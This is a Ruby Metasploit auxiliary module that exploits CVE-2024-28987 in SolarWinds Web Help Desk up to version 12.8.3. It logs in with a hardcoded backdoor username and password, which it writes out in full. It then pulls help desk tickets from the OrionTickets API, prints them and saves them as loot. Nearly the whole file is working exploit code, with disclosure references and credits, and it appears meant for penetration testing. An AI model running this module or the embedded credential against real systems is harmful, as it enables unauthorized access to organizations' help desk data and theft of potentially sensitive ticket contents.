class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SolarWinds Web Help Desk Backdoor (CVE-2024-28987)',
        'Description' => %q{
          This module exploits a backdoor in SolarWinds Web Help Desk <= v12.8.3 to retrieve all tickets from the system.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Zach Hanley' # Discovery & PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-28987'],
          ['URL', 'https://www.solarwinds.com/trust-center/security-advisories/cve-2024-28987'],
          ['URL', 'https://support.solarwinds.com/SuccessCenter/s/article/SolarWinds-Web-Help-Desk-12-8-3-Hotfix-2'],
          ['URL', 'https://www.horizon3.ai/attack-research/cve-2024-28987-solarwinds-web-help-desk-hardcoded-credential-vulnerability-deep-dive/'],

        ],
        'DisclosureDate' => '2024-08-22',
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => 'True'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Web Help Desk', '/']),
        OptInt.new('TICKETSTODUMP', [false, 'The number of tickets to dump', 10])
      ]
    )
  end

  def check
    @auth = auth

    if @auth.code == 401
      return Exploit::CheckCode::Safe
    elsif @auth.code == 200
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Unknown
  end

  def auth
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets'),
      'headers' => {
        'Authorization' => 'Basic ' +  Rex::Text.encode_base64('helpdeskIntegrationUser:dev-C4F8025E7')
      }
    )
    res
  end

  def run
    print_status('Authenticating with the backdoor account "helpdeskIntegrationUser"...')
    @auth ||= auth

    body = @auth.body
    fail_with(Failure::UnexpectedReply, 'Unexpected Reply: ' + @auth.to_s) unless body.include?('shortSubject')

    report_service( 
        host: rhost, 
        port: rport, 
        proto: 'tcp', 
        name: 'SolarWinds Web Help Desk'
      ) 

    jbody = JSON.parse(body)
    print_good('Successfully authenticated and tickets retrieved. The first 1000 characters are displayed below:')
    print_good(JSON.pretty_generate(jbody).slice(0, 1000))

    file = store_loot('solarwinds_webhelpdesk.json', 'text/json', datastore['USER'], jbody)
    print_good("Saved tickets to #{file}")
    
    report_vuln(
          host: rhost,
          port: rport,
          name: name,
          refs: references,
          info: 'The backdoor helpdeskIntegrationUser:dev-C4F8025E7 works.'
        )
  end
end
